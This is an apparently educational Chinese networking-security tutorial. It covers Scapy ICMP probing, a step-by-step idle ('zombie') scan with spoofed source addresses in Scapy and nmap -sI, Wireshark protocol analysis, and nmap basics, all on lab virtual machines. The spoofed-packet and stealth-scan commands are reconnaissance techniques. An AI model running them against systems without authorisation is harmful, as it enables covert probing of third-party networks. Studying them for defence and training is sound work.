+<p>IP().display()<br><img src="/images/BA789978144A430e94F7B2E14C2364C9.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">version</span> <span class="hljs-operator">=</span>   <span class="hljs-number">4</span>           版本：<span class="hljs-number">4</span>，即IPv4<br><span class="hljs-attribute">ihl</span>     <span class="hljs-operator">=</span>   None        首部长度<br><span class="hljs-attribute">tos</span>     <span class="hljs-operator">=</span>   <span class="hljs-number">0</span>x0         服务<br><span class="hljs-attribute">len</span>     <span class="hljs-operator">=</span>   None        总长度<br><span class="hljs-attribute">id</span>      <span class="hljs-operator">=</span>   <span class="hljs-number">1</span>           标识<br><span class="hljs-attribute">flags</span>   <span class="hljs-operator">=</span>               标志位<br><span class="hljs-attribute">frag</span>    <span class="hljs-operator">=</span>   <span class="hljs-number">0</span>           标志<br><span class="hljs-attribute">ttl</span>     <span class="hljs-operator">=</span>   <span class="hljs-number">64</span>          生存时间<br><span class="hljs-attribute">proto</span>   <span class="hljs-operator">=</span>   hopopt      传输控制协议    IPv64逐跳选项<br><span class="hljs-attribute">chksum</span>  <span class="hljs-operator">=</span>   None        首部校验和<br><span class="hljs-attribute">src</span>     <span class="hljs-operator">=</span>   <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>   源地址<br><span class="hljs-attribute">dst</span>     <span class="hljs-operator">=</span>   <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>   目的地址<br></code></pre></td></tr></table></figure>
+
+<p>注：IP()生成ping包的源IP和目标IP，ICMP()生ping包的类型，使用IP()和ICMP()两个函数，可以生成ping包，进行探测。</p>
+<p>思路：</p>
+<ol>
+<li>修改IP包头的dst，也就是我们的目的地址</li>
+<li>拼接上ICMP的数据包类型</li>
+<li>使用sr1()进行发送数据包并接收数据包</li>
+</ol>
+<p><img src="/images/94D96BC9405345bdA95159882FC82221.png" srcset="/img/loading.gif" lazyload></p>
+<p>sr1(IP(dst&#x3D;”192.168.201.1”)&#x2F;ICMP(),timeout&#x3D;1)</p>
+<p><img src="/images/1E5F67C43050435c8DA9F47D51870BC8.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="实战二—僵尸扫描"><a href="#实战二—僵尸扫描" class="headerlink" title="实战二—僵尸扫描"></a>实战二—僵尸扫描</h2><h3 id="僵尸扫描概述"><a href="#僵尸扫描概述" class="headerlink" title="僵尸扫描概述"></a>僵尸扫描概述</h3><p>僵尸主机：僵尸主机是指感染僵尸程序病毒，从而被黑客程序控制的计算机设备。但是僵尸扫描中的僵尸主机指的是一个闲置的操作系统（这里的闲置指主机不会主动和任何人通信），且此系统中IP数据包中ID是递增的。</p>
+<p>IPID：指的是同行过程中，IP数据包中的ID。</p>
+<p>僵尸扫描拥有极高的隐蔽特性，但是实施条件苛刻。</p>
+<ol>
+<li>目标网络可伪造源地址进行访问。</li>
+<li>选择僵尸机，僵尸机需要在互联网上是一个闲置的操作系统，需要系统使用递增的IPID，比如XP系统。</li>
+</ol>
+<h3 id="僵尸扫描原理"><a href="#僵尸扫描原理" class="headerlink" title="僵尸扫描原理"></a>僵尸扫描原理</h3><p>1、 端口开放状态扫描原理：<br>TCP 三次握手发包过程中，SYN&#x2F;ACk是第二次包。</p>
+<p><img src="/images/D238C663779B4416917D9FC7B0B1B254.png" srcset="/img/loading.gif" lazyload></p>
+<p>第一步：参考图1</p>
+<ol>
+<li>攻击者向僵尸机发送SYN&#x2F;ACK确认包。</li>
+<li>僵尸主机返回我们RST数据包关闭链接，RST数据包中包含了IPID信息，假设IPID&#x3D;X</li>
+</ol>
+<p>注：三次握手的第一个包是SYN，目标主机收到SYN才会应答SYN&#x2F;ACK，因为僵尸主机没有向我们发送SYN请求，所以僵尸主机返回我们RST数据包关闭链接。<br><strong>第一步中，黑客的收获是：知道了僵尸主机的IPID。</strong></p>
+<p>第二步：参考图2</p>
+<ol>
+<li><p>攻击者修改IP包头的SRC字段为僵尸主机的IP，伪装成僵尸主机给目标主机发SYN请求。</p>
+</li>
+<li><p>目标主机收到请求，如果端口是开放的就会返回给僵尸主机一个SYN&#x2F;ACK的数据包。</p>
+</li>
+<li><p>僵尸主机收到目标主机发来的SYN&#x2F;ACK确认包，因为僵尸主机没有给你发SYN请求，所以僵尸主机给目标主机返回了一个RST数据包，这个数据包表示关闭连接，此僵尸主机对外发出一个数据包，所以僵尸主机的IPID值+1，此时IPID值为X+1。</p>
+</li>
+</ol>
+<p><strong>第二步中，黑客的收获是：如果目标主机端口开放，让僵尸主机的IPID+1</strong></p>
+<p>第三步：参考图3</p>
+<ol>
+<li><p>攻击者再次向僵尸主机发送SYN&#x2F;ACK确认包。</p>
+</li>
+<li><p>僵尸主机同样向攻击者返回了一个RST数据包，此僵尸主机对外又发出一个数据包，所以僵尸主机的IPID值再+1，此时IPID值为X+2。</p>
+</li>
+</ol>
+<p>第四步：计算3次通信过中的IPID</p>
+<ol>
+<li><p>攻击者查看僵尸主机返回的数据包中IPID值为X+2。</p>
+</li>
+<li><p>攻击者对比在第一步中的IPID值X，发现增加了2.</p>
+</li>
+</ol>
+<p>结论：肯定目标主机和僵尸主机通信了，能通信，就说明目标主机端口是开放的。</p>
+<p>2、端口关闭状态扫描原理</p>
+<p><img src="/images/D83FA6549C0343ffA93E0C0F998B4E45.png" srcset="/img/loading.gif" lazyload></p>
+<p>第一步：参考图1</p>
+<ol>
+<li><p>攻击者向僵尸机发送SYN&#x2F;ACK确认包。</p>
+</li>
+<li><p>僵尸主机返回哦我们RST数据包关闭链接，数据包中包含了IPID信息，假设IPID&#x3D;X</p>
+</li>
+</ol>
+<p>注：三次握手的第一个包是SYN、目标主机收到SYN才会应答SYN&#x2F;ACK，因为僵尸主机没有向我们发送SYN请求，所以僵尸主机返回我们RST数据包关闭链接。</p>
+<p>第二步：参考图2</p>
+<ol>
+<li><p>攻击者修改IP包头的SRC字段为僵尸主机的IP，伪装成僵尸主机给目标主机发SYN请求。</p>
+</li>
+<li><p>目标主机收到请求，如果端口是关闭的，就会返回给僵尸主机一个RST的数据包。</p>
+</li>
+<li><p>僵尸主机收到目标主机发来的RST包，关闭链接不对外发送数据包，此僵尸主机的IPID值还是X。</p>
+</li>
+</ol>
+<p>第三步：参考图3</p>
+<ol>
+<li><p>攻击者再次向僵尸主机发送SYN&#x2F;ACK确认包。</p>
+</li>
+<li><p>僵尸主机同样向攻击者返回了一个RST数据包，此僵尸主机对外发出一个数据包，所以僵尸主机的IPID值+1，此时IPID值为X+1</p>
+</li>
+</ol>
+<p>第四步：计算3次通信过的IPID值</p>
+<ol>
+<li><p>攻击者查看僵尸主机返回的数据包中的IPID值为X+1.</p>
+</li>
+<li><p>攻击者对比在第一步中的IPID值X，发现增加了1。</p>
+</li>
+</ol>
+<p>结论：肯定目标主机和僵尸主机没有通信了，没能通信，就说明目标主机端口是关闭的。<br>以上就是僵尸扫描原理。</p>
+<h3 id="僵尸扫描-–-实战"><a href="#僵尸扫描-–-实战" class="headerlink" title="僵尸扫描 – 实战"></a>僵尸扫描 – 实战</h3><p>实验拓扑图：<br><img src="/images/6102769AC60948d989315AD1559A2569.png" srcset="/img/loading.gif" lazyload></p>
+<p>虚拟机下载windwosxp<br>以一台XP的虚拟机为僵尸主机，IP地址为192.168.201.130并关闭XP系统的防火墙<br>admin为目标主机，IP地址为192.168.201.129<br>先要打开scapy</p>
+<p>第一步：给僵尸主机发送的SYN&#x2F;ACK数据包，将返回的数据包存入rz1</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">rz0=sr1(<span class="hljs-constructor">IP(<span class="hljs-params">dst</span>=<span class="hljs-string">&quot;192.168.201.130&quot;</span>)</span>/<span class="hljs-constructor">TCP(<span class="hljs-params">dport</span>=445,<span class="hljs-params">flags</span>=<span class="hljs-string">&quot;SA&quot;</span>)</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/B1BB3A97737B4208A28D5E821231B1B4.png" srcset="/img/loading.gif" lazyload><br>命令详解：<br>rz0 表示定义了一个变量来接受我们返回的数据包<br>dst 表示我们的僵尸主机IP<br>dport&#x3D;445 表示我们向僵尸主机的445端口发送数据包，XP主机的445端口一般都是开启状态<br>flags&#x3D;”SA”表示发送SYN&#x2F;ACK</p>
+<p>rz0.display()<br><img src="/images/6F9245C1634D4f23AA33E06FD5856F8E.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二步：攻击者修改IP包头的SRC字段为僵尸主机的IP，伪装成僵尸主机给目标主机发SYN请求</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">rt0=sr1(<span class="hljs-constructor">IP(<span class="hljs-params">src</span>=<span class="hljs-string">&quot;192.168.201.130&quot;</span>,<span class="hljs-params">dst</span>=<span class="hljs-string">&quot;192.168.201.129&quot;</span>)</span>/<span class="hljs-constructor">TCP(<span class="hljs-params">dport</span>=22)</span>,timeout=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/1BA4CB4080E84793A1F1F1D81C9A3D77.png" srcset="/img/loading.gif" lazyload><br>命令详解：</p>
+<p>rt0 表示定义了一个变量来接受我们返回的数据包<br>src 表示伪装成僵尸主机的IP地址<br>dst 表示将数据包发送目标主机<br>dport 目标端口<br>timeout 超时时间</p>
+<p>rt0.display()<br><img src="/images/899B9C2053D64ce49BFB949F074834B0.png" srcset="/img/loading.gif" lazyload></p>
+<p>第三步：攻击者再次向僵尸主机发送SYN&#x2F;ACK确认包，获得IPID</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">rz2=sr1(<span class="hljs-constructor">IP(<span class="hljs-params">dst</span>=<span class="hljs-string">&quot;192.168.201.130&quot;</span>)</span>/<span class="hljs-constructor">TCP(<span class="hljs-params">dport</span>=445,<span class="hljs-params">flags</span>=<span class="hljs-string">&quot;SA&quot;</span>)</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/A5B23482FC8446ed86FD789F5FC8FD12.png" srcset="/img/loading.gif" lazyload></p>
+<p>rz2.display()<br><img src="/images/677A0C60C5C144d7B931C021114F7360.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到rz0到rz2的id值变了2个，证明目标端口开放</p>
+<p>同样探测端口关闭<br>我们探测222端口</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">rz1=sr1(<span class="hljs-constructor">IP(<span class="hljs-params">dst</span>=<span class="hljs-string">&quot;192.168.201.130&quot;</span>)</span>/<span class="hljs-constructor">TCP(<span class="hljs-params">dport</span>=445,<span class="hljs-params">flags</span>=<span class="hljs-string">&quot;SA&quot;</span>)</span>)<br><br>rt=sr1(<span class="hljs-constructor">IP(<span class="hljs-params">src</span>=<span class="hljs-string">&quot;192.168.201.130&quot;</span>,<span class="hljs-params">dst</span>=<span class="hljs-string">&quot;192.168.201.129&quot;</span>)</span>/<span class="hljs-constructor">TCP(<span class="hljs-params">dport</span>=222)</span>,timeout=<span class="hljs-number">1</span>)<br><br>rz2=sr1(<span class="hljs-constructor">IP(<span class="hljs-params">dst</span>=<span class="hljs-string">&quot;192.168.201.130&quot;</span>)</span>/<span class="hljs-constructor">TCP(<span class="hljs-params">dport</span>=445,<span class="hljs-params">flags</span>=<span class="hljs-string">&quot;SA&quot;</span>)</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/24CEB3A05A9B43f2875428D868295CFF.png" srcset="/img/loading.gif" lazyload><br>增1个，证明端口关闭</p>
+<h3 id="使用nmap进行僵尸扫描"><a href="#使用nmap进行僵尸扫描" class="headerlink" title="使用nmap进行僵尸扫描"></a>使用nmap进行僵尸扫描</h3><ol>
+<li>扫描192.168.1.0网段中某些机器可以作为僵尸主机</li>
+</ol>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nmap <span class="hljs-number">192.168</span>.<span class="hljs-number">201.0</span>/<span class="hljs-number">24</span> -p1-<span class="hljs-number">1024</span> <span class="hljs-attr">--script</span>=ipidseq<span class="hljs-selector-class">.nse</span> &gt;<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> <br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/EF338AB5EB8D4b32849506C552B7F9E2.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="2">
+<li>使用nmap进行僵尸扫描</li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.201.129</span> -sI <span class="hljs-number">192.168.201.130</span> -p1-<span class="hljs-number">100</span>  <br></code></pre></td></tr></table></figure>
+<p>目标主机ip：192.168.201.129<br>僵尸机IP：192.168.201.130<br><img src="/images/60684AD1D5F2497397A653FF81646A1A.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="wireshark抓包及常用协议分析"><a href="#wireshark抓包及常用协议分析" class="headerlink" title="wireshark抓包及常用协议分析"></a>wireshark抓包及常用协议分析</h1><h2 id="wireshark简介"><a href="#wireshark简介" class="headerlink" title="wireshark简介"></a>wireshark简介</h2><p>wireshark是一个网络封包分析软件，网络分包分析软件的功能是撷(xie)取😅网络封包，并尽可能显示出最为详细的网络封包资料，wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换。</p>
+<h2 id="wireshark的应用"><a href="#wireshark的应用" class="headerlink" title="wireshark的应用"></a>wireshark的应用</h2><p>网络管理员使用wireshark来检测网络问题，网络安全工程师使用wireshark来检查咨询安全相关问题，开发者使用wireshark来为新的通讯协议除错，普通使用者使用wireshark来学习网络协议的相关知识。当然，有的人也会“居心叵(po)测”的用它来寻找一些敏感信息。。。。</p>
+<h2 id="wireshark快速分析数据包技巧"><a href="#wireshark快速分析数据包技巧" class="headerlink" title="wireshark快速分析数据包技巧"></a>wireshark快速分析数据包技巧</h2><ol>
+<li><p>确定wireshark的物理位置。如果没有一个正确的位置，启动wireshark后会花费很长的时间捕获一些与自己无关的数据。</p>
+</li>
+<li><p>选择捕获接口。一般都是选择连接到Internet网络的接口，这样才可以捕获到与网络相关的数据，否则，捕获到的其它数据对自己也没有任何帮助。</p>
+</li>
+<li><p>使用捕获过滤器。通过设置捕获过滤器，可以避免产生过大的捕获数据，这样用户在分析数据时，也不会受到其它数据干扰，而且，还可以为用户节约大量的时间。</p>
+</li>
+<li><p>使用显示过滤器。通常使用捕获过滤器过滤后的数据，往往还是很复杂，为了使过滤的数据包再更细致，此时使用显示过滤器进行过滤。</p>
+</li>
+<li><p>使用着色规则。通常使用显示过滤器过滤后的数据，都是有用的数据包，如果想更加突出的显示某个会话，可以使用着色规则高亮显示。</p>
+</li>
+<li><p>构造图表，如果用户想要更明显的看出一个网络中数据的变化情况，使用图表的形式可以很方便的展现数据分布情况。</p>
+</li>
+<li><p>重组数据。当传输较大的图片或文件时，需要将信息分布在多个数据包中。这时候就需要使用重组数据的方法来抓取完整的数据，wireshark的重组功能，可以重组一个会话中不同数据包的信息，或者是重组一个完整的图片或文件。</p>
+</li>
+</ol>
+<h2 id="实战：Wireshark抓包及快速定位数据包技巧"><a href="#实战：Wireshark抓包及快速定位数据包技巧" class="headerlink" title="实战：Wireshark抓包及快速定位数据包技巧"></a>实战：Wireshark抓包及快速定位数据包技巧</h2><h3 id="常见协议包"><a href="#常见协议包" class="headerlink" title="常见协议包"></a>常见协议包</h3><p>ARP协议<br>ICMP协议<br>TCP协议<br>UDP协议<br>DNS协议<br>HTTP协议</p>
+<p>kali打开wireshark，网卡选择eth0<br><img src="/images/A31000CEC78C4d71BA90E481F5EDCC12.png" srcset="/img/loading.gif" lazyload><br>然后就开始抓取数据包了<br><img src="/images/E8FD04A6A845455dAA73A09308EED2CF.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="混杂模式介绍"><a href="#混杂模式介绍" class="headerlink" title="混杂模式介绍"></a>混杂模式介绍</h3><ol>
+<li><p>混杂模式概述：混杂模式就是接受所有经过网卡的数据包，包括不是发给本机的包，即不验证MAC地址，普通模式下网卡只接收发给本机的包(包括广播包)传递给上层程序，其它的包一律丢弃。<br>一般来说，混杂模式不会影响网卡的正常工作，多在网络监听工具上使用。</p>
+</li>
+<li><p>关闭和开启混杂模式方法</p>
+</li>
+</ol>
+<p>捕获选项，取消对勾就进入普通模式<br><img src="/images/DDEAAB1CD27342c4A703733A1A096E09.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="WireShark的过滤器使用"><a href="#WireShark的过滤器使用" class="headerlink" title="WireShark的过滤器使用"></a>WireShark的过滤器使用</h2><p>我们开启混淆模式来做一下感受，我们再次捕获。。。在所有接口上使用混杂模式就可以直接进行抓包了<br>开启混杂模式，抓一些包<br><img src="/images/65252D7C918F464f9ECF767FB8227C4D.png" srcset="/img/loading.gif" lazyload></p>
+<p>如只想要tcp的包，可以在过滤器输入tcp<br><img src="/images/B776173511FB4dd2893460E739A986C2.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用过滤器筛upd的数据包</p>
+<p><img src="/images/9E5ECCB1823D42538ABA994BE1C0A4A4.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们使用过滤器输入“udp”以筛选出udp报文，但是为什么输入udp之后出现那么多种协议呢？<br>原因就是oicq以及dns都是基于udp的传输层上的协议。</p>
+<p>扩展：客户端向DNS服务器查询域名，一般返回的内容都不超过512字节，用UDP传输即可，不用经过三次握手，这样DNS服务器负载更低，响应更快，理论上说，客户端也可以指定向DNS服务器查询时用TCP，但事实上，很多DNS服务器进行配置的时候，仅支持UDP查询包。</p>
+<p>筛选源地址是192.168.201.128 或目的地址是192.168.201.1</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ip.src_host <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">201.128</span> or ip.dst_host <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">201.1</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/114190BA9117408eA7CE5D8D2FB707F6.png" srcset="/img/loading.gif" lazyload></p>
+<p>不分源和目的地址</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ip.addr <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">201.128</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/34EF3E91898749a9B8E70ED028D60A79.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="使用WireShark对常用协议抓包并分析原理"><a href="#使用WireShark对常用协议抓包并分析原理" class="headerlink" title="使用WireShark对常用协议抓包并分析原理"></a>使用WireShark对常用协议抓包并分析原理</h2><p>协议分析的时候我们关闭混淆模式，避免一些干扰的数据包存在。</p>
+<h3 id="常用协议分析–ARP协议"><a href="#常用协议分析–ARP协议" class="headerlink" title="常用协议分析–ARP协议"></a>常用协议分析–ARP协议</h3><p>地址解析协议ARP是一个通过解析网络层地址来找寻数据链路层地址的网络传输协议，他在IPv4中极其重要。ARP是通过网络地址来定位MAC地址。</p>
+<p>开始抓包–过滤arp<br><img src="/images/B25D68E392574b969CC66C46B768AC74.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们使用nmap来基于ARP协议进行扫描</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sn <span class="hljs-number">192.168.201.254</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/58FEE3B671B5440d9FBDE50EEE1E1EFE.png" srcset="/img/loading.gif" lazyload><br>Address Resolution Protocol(request)                    #ARP地址解析协议 reply表示回复包<br>Hardware type:Ethernet(1)                               #硬件类型<br>Protocol type:IPv4(0x0800)                              #协议类型<br>Hardware size:6                                         #硬件地址<br>Protocol size:4                                         #协议长度<br>0pcode:request(1)                                       #操作码，该值为1表示ARP请求包<br>Sender MAC address:VMware 17:3d:7f(00:0c:29:17:3d:7f)   #源MAC地址<br>Sender Ip address:192.168.201.128                       #源IP地址<br>Target MAc address:00:00:00 00:00:00(00:00:00:00:00:00) #目标MAC地址<br>Target IP address:192.168.201.254                       #目标IP地址</p>
+<p><img src="/images/D5B05225B41049ae942A0CF1BF1C49C4.png" srcset="/img/loading.gif" lazyload></p>
+<p>Address Resolution Protocol(reply) #ARP地址解析协议 reply表示回复包<br>Hardware type:Ethernet(1)          #硬件类型<br>Protocol type:IPv4(x0800)          #协议类型<br>Hardware size:6                    #硬件地址<br>Protocol size:4                    #协议长度<br>0pcode:reply(2)                    #操作码，该值为2表示ARP回复包<br>Sender MAC address:VMware f9:91:5c (00:50:56:f9:91:5c)  #源MAC地址<br>Sender Ip address:192.168.201.254                       #源IP地址<br>Target MAC address:VMware 17:3d:7f (00:0c:29:17:3d:7f)  #目标MAC地址<br>Target Ip address:192.168.201.128                       #目标IP地址</p>
+<p>总结：我们可以看到应答包补全了自己的MAC地址，目的地址和源地址做了替换</p>
+<p>两个数据包的请求和过程<br><img src="/images/C79C096949FE481b859B67CF73DA2494.png" srcset="/img/loading.gif" lazyload></p>
+<p>192.168.201.128 广播：谁有192.168.201.254的MAC地址</p>
+<p>192.168.201.254 应答：192.168.201.254 的MAC地址是xxxxxxxxx</p>
+<h3 id="常用协议分析-ICMP-协议"><a href="#常用协议分析-ICMP-协议" class="headerlink" title="常用协议分析-ICMP 协议"></a>常用协议分析-ICMP 协议</h3><p>我们把之前的数据包清空掉然后筛选icmp协议的数据包</p>
+<p>打开终端，发送1个ping包，方便我们分析发送完之后停止抓包即可</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ping www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> -c <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+
+<p><img src="/images/87D07AAEE91E48758B1679B3F6E8DB35.png" srcset="/img/loading.gif" lazyload></p>
+<p>下面我们开始分析ICMP协议包：<br><strong>ICMP协议分析请求包</strong><br>Internet Control Message Protocol<br>Type:8(Echo(ping)request)<br>Code:0                  #协议类型8，代码0 表示回显请求，即ping请求<br>Checksum:0x7c79 [correct]   #校验和，用于检查错误的数据<br>[Checksum Status:Good]      #校验状态Good<br>Identifier(BE):7151(0x1bef)<br>Identifier(LE):61211(0xef1b) #ID值，在应答包中返回该字段<br>Sequence Number(BE):1(0x0001)<br>Sequence Number(LE):256 (0x0100)#序列号依旧在应答包中返回该字段<br>[IResponse frame:8] #响应帧的序列号，8<br>Timestamp from icmp data:Jul 29，2024 20:21:24.316336000CST<br>[Timestamp from icmp data(relative):0.000014767seconds]<br>Data(40 bytes)  填充数据，共40字节</p>
+<p><strong>ICMP协议分析应答包</strong></p>
+<p>Internet controlMessage Protocol<br>Type :0 (Echo(ping)reply)<br>Code :0         #协议类型0代码0表示回显应答报文<br>Checksum:0x8479[correct]<br>[Checksum Status:Good]#校验和<br>Identifier(BE):7151(0x1bef)<br>Identifier(LE):61211(0xef1b)<br>Sequence Number(BE):1(0x0001)<br>Sequence Number(LE):256(0x0100)#这里四行的ID和序列号和我们的请求包中一致<br>[Request frame:7]#请求帧的序列号<br>[Response time:22.834 ms]#响应时间<br>Timestamp from icmp data: Jul 29,2024 20:21:24.316336000 CST<br>[Timestamp from icmp data(relative):0.022848581 seconds]<br>Data(40 bytes)#填充数据，共40字节</p>
+<p>工作过程</p>
+<p>本机发送一个ICMP Echo Request的包<br>接受方返回一个ICMP Echo Reply，包含了接受到数据拷贝和一些其他指令</p>
+<h3 id="常用协议分析-TCP协议"><a href="#常用协议分析-TCP协议" class="headerlink" title="常用协议分析-TCP协议"></a>常用协议分析-TCP协议</h3><p>首先是清空数据包然后筛选tcp开始抓包</p>
+<p>我们模拟一下tcp会话建立<br>我们通过Xshell远程连接kali就会捕获到完整的TCP3次握手的连接。<br><img src="/images/9AC7520530C84517A8B34B449585F14F.png" srcset="/img/loading.gif" lazyload><br>可以统计-流量图，流类型TCP来查看三次握手<br><img src="/images/4BD07D5B4E6B416aA2E0AEB9E06021EF.png" srcset="/img/loading.gif" lazyload><br>前面3个就是TCP建立链接的过程，后面的就是相互通信的过程了这个时候seq就会根据数据包的大小改变<br>四次挥手也会产生TCP包</p>
+<h3 id="常用协议分析-HTTP协议"><a href="#常用协议分析-HTTP协议" class="headerlink" title="常用协议分析-HTTP协议"></a>常用协议分析-HTTP协议</h3><p>我们还是筛选TCP协议因为HTTP是TCP的上层协议，所以我们过滤TCP的数据包会包含HTTP协议的数据包</p>
+<p>我们打开一个终端输入下面命令</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">curl -<span class="hljs-selector-tag">I</span> www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/E0D5E817C1A4a96A268867B3245EBB3.png" srcset="/img/loading.gif" lazyload></p>
+<p>curl 是一个在命令行下工作的文件传输工具，我们这里用来发送http请求<br>-I 大写的i表示仅返回头部信息</p>
+<p><img src="/images/85D370A5FDB04d8fADB6499703C25C80.png" srcset="/img/loading.gif" lazyload><br>可以看到三次握手，四次挥手<br>中间两个HTTP中间有个ACK，就是发送了一个请求</p>
+<h1 id="nmap高级使用技巧和漏洞扫描发现"><a href="#nmap高级使用技巧和漏洞扫描发现" class="headerlink" title="nmap高级使用技巧和漏洞扫描发现"></a>nmap高级使用技巧和漏洞扫描发现</h1><h2 id="nmap高级使用技巧"><a href="#nmap高级使用技巧" class="headerlink" title="nmap高级使用技巧"></a>nmap高级使用技巧</h2><h3 id="namp概述"><a href="#namp概述" class="headerlink" title="namp概述"></a>namp概述</h3><p>nmap是一个网络探测和安全扫描程序，系统管理者和个人可以使用这个软件扫描大型的网络，获取那台主机正在运行以及提供什么服务等信息，nmap支持很多扫描技术，例如：UDP、TCP connect()、TCP SYN(半开扫描)、ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描和null扫描，还可以探测操作系统类型。</p>
+<p>nmap可用于</p>
+<ul>
+<li><p>检测活在网络上的主机(主机发现)</p>
+</li>
+<li><p>检测主机上开放的端口(端口发现或枚举)</p>
+</li>
+<li><p>检测到相应的端口(服务发现)的软件和版本</p>
+</li>
+<li><p>检测操作系统，硬件地址，以及软件版本</p>
+</li>
+<li><p>检测脆弱性的漏洞(Nmap的脚本)</p>
+</li>
+</ul>
+<h3 id="NMAP-端口状态解析"><a href="#NMAP-端口状态解析" class="headerlink" title="NMAP 端口状态解析"></a>NMAP 端口状态解析</h3><p>端口扫描时Nmap最基本最核心的功能，用于确定目标主机的TCP&#x2F;UDP端口的开放情况。</p>
+<ul>
+<li><p>open：应用程序在该端口接收TCP连接或者UDP报文。</p>
+</li>
+<li><p>closed：关闭的端口对于nmap也是可访问的，它接收nmap探测报文并做出响应，但没有应用程序在其上监听。</p>
+</li>
+<li><p>filtered：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放，过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</p>
+</li>
+<li><p>unfiltered：未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭，只有用于映射防火墙规则集的ACK扫描才会把端口分类到这个状态。</p>
+</li>
+<li><p>open|filtered：无法确定端口是开放还是被过滤，开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议，FIN，Null等扫描会引起。</p>
+</li>
+<li><p>closed|filtered：(关闭或者被过滤的)：无法确定端口是关闭的还是被过滤的。</p>
+</li>
+</ul>
+<h3 id="NMAP-语法及示例"><a href="#NMAP-语法及示例" class="headerlink" title="NMAP 语法及示例"></a>NMAP 语法及示例</h3><p>语法：<code>nmap[Scan Type(s)] [Options]</code></p>
+<p>例1：使用nmap扫描一台服务器<br><strong>默认情况下，Nmap会扫描1000个最有可能开放的TCP端口。</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.201.129</span><br></code></pre></td></tr></table></figure>
+<p>扫一下我们的centos<br><img src="/images/23BEE376E6E94b3fB9F42315C5105C12.png" srcset="/img/loading.gif" lazyload></p>
+<p>例2：扫描一台机器，查看它打开的端口及详细信息</p>
+<p>参数说明：</p>
+<p>-v 表示显示冗余信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态。</p>
